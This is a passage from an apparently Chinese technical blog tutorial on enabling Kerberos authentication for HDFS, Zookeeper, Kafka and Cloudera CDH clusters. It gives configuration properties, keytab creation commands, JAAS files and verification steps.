plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authentication&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;kerberos&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authorization&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>在集群总所有节点的<code>hdfs-site.xml</code>文件中添加下面的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.block.access.token.enable&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;  </span><br><span class="line">  &lt;name&gt;dfs.datanode.data.dir.perm&lt;/name&gt;  </span><br><span class="line">  &lt;value&gt;700&lt;/value&gt;  </span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1004&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.http.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1006&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果想开启 SSL，请添加（本文不对这部分做说明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.http.policy&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTPS_ONLY&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果 HDFS 配置了 QJM HA，则需要添加（另外，你还要在 zookeeper 上配置 kerberos）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.kerberos.internal.spnego.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果配置了WebHDFS，则添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.web.authentication.kerberos.keytab&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>配置中需要注意的点：</p><p>1.<code>dfs.datanode.address</code>表示<code>data transceiver RPC server</code>所绑定的<code>hostname</code>或IP地址，如果开启 security，端口号必须小于 1024(privileged port)，否则的话启动 datanode 时候会报 <code>Cannot start secure cluster without privileged resources</code> 错误。</p><p>2.<code>principal</code> 中的 <code>instance</code> 部分可以使用 _HOST 标记，系统会自动替换它为全称域名。</p><p>3.如果开启了 <code>security, hadoop</code> 会对 <code>hdfs block data</code>(由 dfs.data.dir 指定)做 <code>permission check</code>，方式用户的代码不是调用<code>hdfs api</code>而是直接本地读<code>block data</code>，这样就绕过了<code>kerberos</code>和文件权限验证，管理员可以通过设置 <code>dfs.datanode.data.dir.perm</code> 来修改 <code>datanode</code> 文件权限，这里我们设置为700</p><p>CDH的权限管理（<a href="https://www.cloudera.com/documentation/enterprise/6/latest/topics/cm_sg_s1_install_cm_cdh.html" target="_blank" rel="noopener">来自cloudera官网</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hdfs：NameNode, DataNodes, and Secondary NameNode</span><br><span class="line">mapred：JobTracker and TaskTrackers (MR1) and Job History Server (YARN)</span><br><span class="line">yarn：ResourceManager and NodeManagers (YARN)</span><br><span class="line">oozie：Oozie Server</span><br><span class="line">hue：Hue Server, Beeswax Server, Authorization Manager, and Job Designer</span><br></pre></td></tr></table></figure><p>目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dfs.name.dir/ hdfs:hadoop</span><br><span class="line">dfs.data.dir/ hdfs:hadoop</span><br><span class="line">mapred.local.dir/ mapred:hadoop</span><br><span class="line">mapred.system.dir in HDFS/ mapred:hadoop</span><br><span class="line">yarn.nodemanager.local-dirs/ yarn:yarn</span><br><span class="line">yarn.nodemanager.log-dirs/ yarn:yarn</span><br><span class="line">oozie.service.StoreService.jdbc.url (if using Derby)/ oozie:oozie</span><br><span class="line">[[database]] name/ hue:hue</span><br><span class="line">javax.jdo.option.ConnectionURL/ hue:hue</span><br></pre></td></tr></table></figure><p>启动NameNode</p><p>启动之前必须确保JCE jar已经替换，首先检查JSVC</p><p>首先master节点查看是否安装了JSVC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/lib/bigtop-utils/</span><br><span class="line">bigtop-detect-classpath  bigtop-detect-javahome  bigtop-detect-javalibs  jsvc</span><br></pre></td></tr></table></figure><p>然后编辑<code>/etc/default/hadoop-hdfs-datanode</code>，取消对下面注释并添加一行JSVC_HOME，修改如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export HADOOP_SECURE_DN_USER=hdfs</span><br><span class="line">export HADOOP_SECURE_DN_PID_DIR=/var/run/hadoop-hdfs</span><br><span class="line">export HADOOP_SECURE_DN_LOG_DIR=/var/log/hadoop-hdfs</span><br><span class="line">export JSVC_HOME=/usr/lib/bigtop-utils</span><br></pre></td></tr></table></figure><p>hadoop-hdfs-datanode同步到其他节点</p><p>随后分别在CDH2、CDH3获取ticket然后启动服务</p><p>#root为root/admin密码</p><p><code>kinit -k -t /etc/hadoop/conf/hdfs.keytab hdfs/master@JIMI.COM; service hadoop-hdfs-datanode start</code></p><p>（这仅仅为master节点上的操作，别的节点类似）</p><p>观察master上的Namenode日志，出现下面的日志表名Datanode启动成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14/11/04 17:21:41 INFO security.UserGroupInformation:</span><br><span class="line">Login successful for user hdfs/cdh2@JAVACHEN.COM using keytab file /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>Tips:</p><ul><li><p>配置 hosts，hostname 请使用小写</p></li><li><p>确保 kerberos 客户端和服务端连通</p></li><li><p>替换 JRE 自带的 JCE jar 包</p></li><li><p>为 DataNode 设置运行用户并配置 JSVC_HOME</p></li><li><p>启动服务前，先获取 ticket 再运行相关命令</p></li></ul><p>Quote:</p><p><a href="https://www.cloudera.com/documentation/enterprise/5-12-x/topics/cdh_sg_kerberos_prin_keytab_deploy.html" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍1</a></p><p><a href="https://blog.cloudera.com/blog/2015/03/how-to-quickly-configure-kerberos-for-your-apache-hadoop-cluster/" target="_blank" rel="noopener">CDH官方文档对Kerberos的介绍2</a></p><p><a href="http://web.mit.edu/~kerberos/krb5-devel/doc/admin/conf_files/krb5_conf.html" target="_blank" rel="noopener">MIT官网的文档</a></p><p><a href="https://docs.oracle.com/cd/E24847_01/html/819-7061/setup-9.html" target="_blank" rel="noopener">Oracle官网对Kerberos的介绍</a></p><hr><h3 id="5-Apach-原生Zookeeper的Kerberos配置及其验证"><a href="#5-Apach-原生Zookeeper的Kerberos配置及其验证" class="headerlink" title="5.Apach 原生Zookeeper的Kerberos配置及其验证"></a>5.Apach 原生Zookeeper的Kerberos配置及其验证</h3><p>Zookeeper的配置分为两个步骤，先配置<code>Server</code>的<code>keytab</code>，再配置<code>Client</code>的<code>keytab</code>,如果<code>zookeeper-client</code> 和 <code>zookeeper-server</code> 安装在同一个节点上，则 <code>java.env</code> 中的 <code>java.security.auth.login.config</code> 参数会被覆盖，这一点从<code>zookeeper-client</code> 命令启动日志可以看出来。</p><p>首先是配置 <code>Zk Server</code></p><p>因为KDC已经配置了，所以KDC不用再配</p><p>第一步直接生成Keytab</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zookeeper/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zookeeper.keytab  zookeeper/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>将Keytab拷贝到目录<code>/etc/zookeeper/conf</code></p><p>在三个节点上分别执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;chown zookeeper:hadoop zookeeper.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>目的是为了控制权限。</p><p>然后修改配置文件</p><p>在三个节点上的zoo.cfg文件中添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>然后创建JAAS配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Server &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab="/etc/zookeeper/conf/zookeeper.keytab"</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal="zookeeper/master@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>三个节点都要有，每个节点里面的principal有点不同</p><p>然后是配置<strong>Zookeeper Client</strong></p><p>还是先生成<code>keytab</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey zkcli/datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/master@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k zkcli.keytab  zkcli/datanode1@JIMI.COM "</span><br></pre></td></tr></table></figure><p>拷贝 zkcli.keytab 文件到其他节点的 <code>/etc/zookeeper/conf</code> 目录，并设置权限，分别在master、datanode0、datanode1 上执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/zookeeper/conf/;</span><br><span class="line">chown zookeeper:</span><br><span class="line">hadoop zkcli.keytab ;chmod 400 *.keytab</span><br></pre></td></tr></table></figure><p>由于 <code>keytab</code> 相当于有了永久凭证，不需要提供密码(如果修改 <code>kdc</code> 中的 <code>principal</code> 的密码，则该 <code>keytab</code> 就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>创建 JAAS 配置文件</p><p>在<code>/etc/zookeeper/conf/</code>创建<code>client-jaas.conf</code>文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Client &#123;</span><br><span class="line">  com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">  useKeyTab=true</span><br><span class="line">  keyTab=&quot;/etc/zookeeper/conf/zkcli.keytab&quot;</span><br><span class="line">  storeKey=true</span><br><span class="line">  useTicketCache=false</span><br><span class="line">  principal=&quot;zkcli@JIMI.COM&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同步到其他节点，然后在<code>/etc/zookeeper/conf/</code>目录创建或者修改<code>java.env</code>，内容如下</p><p><code>export CLIENT_JVMFLAGS=&quot;-Djava.security.auth.login.config=/etc/zookeeper/conf/client-jaas.conf&quot;</code></p><p>并且同步到别的节点上</p><p>接着是验证：</p><p>启动客户端：<code>zookeeper-client -server master:2181</code></p><p>创建一个<code>znode</code>节点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 0] create /znode1 sasl:zkcli@JIMI.COM:cdwra</span><br><span class="line">Created /znode1</span><br></pre></td></tr></table></figure><p>验证该节点是否创建以及其ACL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[zk: master:2181(CONNECTED) 1] getAcl /znode1</span><br><span class="line">    'world,'anyone</span><br><span class="line">    : cdrwa</span><br></pre></td></tr></table></figure><p>只要能够在一个节点上创建<code>znode</code>，在别的节点上能够显示出来，就说明<code>Zookeeper</code>的<code>kerberos</code>已经配置成功。</p><hr><h3 id="6-Apach原生Kafka的Kerberos配置及其验证"><a href="#6-Apach原生Kafka的Kerberos配置及其验证" class="headerlink" title="6.Apach原生Kafka的Kerberos配置及其验证"></a>6.Apach原生Kafka的Kerberos配置及其验证</h3><p>因为之前的操作已经搭建完了<code>KDC</code>，所以省略了自建<code>Kerberos</code>的步骤</p><p>首先还是为<code>broker</code>每台服务器在<code>Kerberos</code>服务器生成相应的<code>principal</code>和<code>Keytab</code>，将下列命令里生成的<code>kafka.keytab</code>文件分发到对应<code>broker</code>机器的统一位置，比如<code>/etc/kafka.keytab</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addprinc -randkey kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">addprinc -randkey kafka/kafkahost3@EXAMPLE.COM</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">xst -norandkey -k /opt/kafkahost1/kafka.keytab kafka/kafkahost1@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost2/kafka.keytab kafka/kafkahost2@EXAMPLE.COM</span><br><span class="line">xst -norandkey -k /opt/kafkahost3/kafka.keytab kafka/kafkahost3@EXAMPLE.COM</span><br></pre></td></tr></table></figure><p>配置kafka server文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listeners=SASL_PLAINTEXT://:9092</span><br><span class="line">security.inter.broker.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.mechanism.inter.broker.protocol=GSSAPI</span><br><span class="line">sasl.enabled.mechanisms=GSSAPI</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">super.users=User:kafka</span><br><span class="line">authorizer.class.name=kafka.security.auth.SimpleAclAuthorizer</span><br></pre></td></tr></table></figure><p>KafkaClient模块是为了bin目录下kafka-console-consumer.sh之类的脚本使用的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">            com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">            useKeyTab=true</span><br><span class="line">            storeKey=true</span><br><span class="line">            keyTab="/etc/kafka.keytab"</span><br><span class="line">            principal="kafka/kafkahost1@EXAMPLE.COM";</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">KafkaClient &#123;</span><br><span class="line">        com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">        useKeyTab=true</span><br><span class="line">        storeKey=true</span><br><span class="line">        keyTab="/etc/kafka.keytab"</span><br><span class="line">        principal="kafka/kafkahost1@EXAMPLE.COM"</span><br><span class="line">        useTicketCache=true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改bin目录下kafka-run-class.sh，在  exec $JAVA 后面增加kerberos启动参数,然后就可以用正常的脚本启动服务了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.config=/opt/kafka/config/kafka_server_jaas.conf</span><br></pre></td></tr></table></figure><p>或者用这个脚本启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">export KAFKA_HEAP_OPTS='-Xmx256M'</span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/zookeeper_jaas.conf'</span><br><span class="line">bin/zookeeper-server-start.sh config/zookeeper.properties &amp;</span><br><span class="line"></span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line">export KAFKA_OPTS='-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.confi</span><br><span class="line">g=/etc/kafka/kafka_server_jaas.conf'</span><br><span class="line">bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure><p>最终的目的都是一样</p><p>客户端脚本使用</p><p>启用kerberos后，部分kafka管理脚本需要增加额外的参数才能使用</p><p>首先建立配置文件<code>client.properties</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.protocol=SASL_PLAINTEXT</span><br><span class="line">sasl.kerberos.service.name=kafka</span><br><span class="line">sasl.mechanism=GSSAPI</span><br></pre></td></tr></table></figure><p>涉及到的zookeeper.properties</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider</span><br><span class="line">requireClientAuthScheme=sasl</span><br><span class="line">jaasLoginRenew=3600000</span><br></pre></td></tr></table></figure><p>所以新命令的使用方式为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server kafkahost1:9092 --list --command-config client.properties</span><br><span class="line">bin/kafka-console-producer.sh --broker-list kafkahost1:9092 --topic test --producer.config client.properties</span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server kafkahost1:9092 --topic test --consumer.config client.properties</span><br></pre></td></tr></table></figure><p>如果之前JCE的包没有安装好的话会报如下错误，需要把JCE包安装到位即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARN [Controller-60-to-broker-60-send-thread], Controller 60's connection to broker kafka60:9092 (id: 60 rack: null) was unsuccessful (kafka.controller.RequestSendThread)</span><br><span class="line">java.io.IOException: Connection to kafka60:9092 (id: 60 rack: null) failed</span><br></pre></td></tr></table></figure><p>能在命令行上运行成功命令行消费者和命令行生产者就说明ZK和Kafka的安装基本搞定，没有问题。</p><p>用Java连接集群上的Kerberos组件篇幅较长，涉及代码，另外开一篇文章说明。</p><hr><h3 id="7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装"><a href="#7-Cloudera’s-Distribution-Including-Apache-Hadoop-CDH-上Kerberos的安装" class="headerlink" title="7.Cloudera’s Distribution Including Apache Hadoop(CDH)上Kerberos的安装"></a>7.Cloudera’s Distribution Including Apache Hadoop(<em>CDH</em>)上Kerberos的安装</h3><p>CDH上面的Kerberos安装其实已经被简化了，简化的好处是安装方便，坏处是一旦出现问题不知从何处下手。所以对前面单独组件的了解是有必要的。实际操作下来，官网和各技术博客都有些许问题。在此记录。</p><p>首先配置KDC，和单独安装操作相同</p><p>首先KDC还是要配置，在CM服务器上配置KDC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-serverkrb5-libs krb5-auth-dialog krb5-workstation</span><br></pre></td></tr></table></figure><p>修改<code>/etc/krb5.conf</code>、<code>/var/kerberos/krb5kdc/kadm5.acl</code>、<code>/var/kerberos/krb5kdc/kdc.conf</code>配置，配置内容相同，不再赘述。</p><p>然后在所有节点上（包括CM）安装Kerberos客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install krb5-libs krb5-workstation</span><br></pre></td></tr></table></figure><p>然后在CM节点上独立安装额外的包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openldap-clients</span><br></pre></td></tr></table></figure><p>分发krb5.conf到另外两个节点</p><p>JCE包还是要记得替换，替换位置：<code>/usr/share/java/jdk1.8.0_144/jre/lib/security</code></p><p>KDC安装完成后，建立测试Kerberos的管理员账号。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5k45t4jj20et03u3yg.jpg" alt="alt admin"></p><hr><p>CM界面 -&gt;管理 -&gt; 安全</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5rgh6faj20o702ut8o.jpg" alt="CDH"></p><p>点击启用</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ar5zj20pe0o43zp.jpg" alt="CDH1"></p><p>全部勾选即可</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a7vuj20n00pmt9i.jpg" alt></p><p>这边别的都好理解，都是和host上面对应的，然后这个加密类型是和krb5.conf对应相同的</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v08hypj20k005dgll.jpg" alt></p><p>这上面有张图没截到，是选择是否要通过CM管理的，一般选择不通过</p><p>这边管理账户输入之前创建的管理账户即可。</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0a1fxj20hz05d0ss.jpg" alt></p><p>这边CDH会帮助验证密码</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0ayqyj20mx0oamxv.jpg" alt></p><p>接下来的这个步骤我标红了一块，我在这边spark2的部分，服务范围设置的是spark2，默认是spark，我修改了一下，避免以后的keytab名字出现歧义</p><hr><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2g5v0e6e7j20oc0q1wfz.jpg" alt></p><p>随后，直接勾选重启选项即可</p><p>初步的配置就完成了</p><hr><p><a 